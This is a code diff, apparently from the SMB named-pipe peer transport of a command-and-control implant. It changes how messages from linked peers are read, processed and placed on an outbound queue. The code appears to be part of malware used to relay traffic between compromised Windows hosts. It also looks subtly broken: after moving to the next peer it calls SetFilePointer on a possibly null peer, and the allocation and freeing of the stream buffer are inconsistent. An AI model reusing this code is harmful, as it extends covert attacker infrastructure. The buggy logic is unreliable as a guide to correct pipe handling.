@@ -388,9 +388,6 @@ namespace Smb {
         uint32_t read = 0;
         uint32_t length = 0;
 
-        stream = R_CAST(_stream*, x_malloc(sizeof(_stream)));
-        stream.buffer = R_CAST(uint8_t*, x_malloc(stream.length));
-
         if (!Ctx->win32.PeekNamedPipe(handle, &length, sizeof(uint32_t), R_CAST(LPDWORD, &read), NULL, NULL) || read == 0) {
             return false;
         }
@@ -413,11 +410,7 @@ namespace Smb {
         while (peer) {
             if (peer->ingress_name) {
 
-                _stream stream = { };
-                uint32_t offset = 0;
-
                 if (!peer->ingress_handle) {
-
                     SmbContextInit(&smb_attr, &sec_attr);
                     if (!(peer->ingress_handle = Ctx->win32.CreateNamedPipeW(peer->ingress_name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &sec_attr))) {
                         return_defer(ntstatus);
@@ -429,16 +422,21 @@ namespace Smb {
                     }
                 }
 
-                while (PeekClientMessage(peer->ingress_handle, stream, offset)) {
+                _stream *stream = R_CAST(_stream*, x_malloc(sizeof(_stream)));
+                uint32_t offset = 0;
+
+                while (PeekClientMessage(peer->ingress_handle, *stream, offset)) {
                     SetFilePointer(peer->ingress_handle, offset, NULL, FILE_BEGIN);
 
-                    if (!ProcessClientMessage(peer->ingress_handle, stream)) {
+                    if (!ProcessClientMessage(peer->ingress_handle, *stream)) {
+                        x_free(stream);
                         return_defer(ntstatus);
                     }
+
+                    Dispatcher::OutboundQueue(stream);
                 }
 
                 Ctx->win32.SleepEx(500, FALSE);
-                SetFilePointer(peer->ingress_handle, 0, NULL, FILE_BEGIN);
 
                 while (head) {
                     if (head->peer_id == peer->peer_id) {
@@ -452,6 +450,8 @@ namespace Smb {
 
                 peer = peer->next;
                 head = Ctx->transport.outbound_queue;
+
+                SetFilePointer(peer->ingress_handle, 0, NULL, FILE_BEGIN);
             }
         }
 
